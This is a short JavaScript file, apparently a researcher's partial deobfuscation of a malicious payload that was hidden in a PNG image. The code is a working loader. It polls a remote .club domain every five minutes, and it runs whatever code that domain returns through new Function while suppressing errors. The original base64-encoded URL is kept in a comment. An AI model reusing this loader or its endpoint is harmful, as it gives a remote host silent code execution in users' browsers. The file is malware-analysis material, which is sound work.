/*
    This is the payload in 1499654451774_512.png
    Clever wrapping. I liked that.
    Partial deobfuscation by [REDACTED], released under MIT license.
*/

/*
    This endpoint uses cloudflare.
*/

var PAYLOAD_ENDPOINT = "https://1921ni2ajdw077.club/api/code.json", // var PAYLOAD_ENDPOINT="aHR0cHM6Ly8xOTIxbmkyYWpkdzA3Ny5jbHViL2FwaS9jb2RlLmpzb24=",
    MyExtension = {
        init: function () {
            MyExtension.getPayload();
            setInterval(function () {
                MyExtension.getPayload()
            }, 3E5)
        },
        run: function (a) {
            try {
                (new window.Function(a))()
            } catch (b) {}
        },
        getPayload: function () {
            var a = new XMLHttpRequest;
            a.responseType = "json";
            a.open("GET", PAYLOAD_ENDPOINT, !0); // a.open("GET",atob(PAYLOAD_ENDPOINT),!0);
            a.onload = function () {
                try {
                    MyExtension.run(a.response) // payload under a payload? alright. See requestfrom_PAYLOAD_ENDPOINT.js
                } catch (b) {}
            };
            a.send()
        }
    };
MyExtension.init();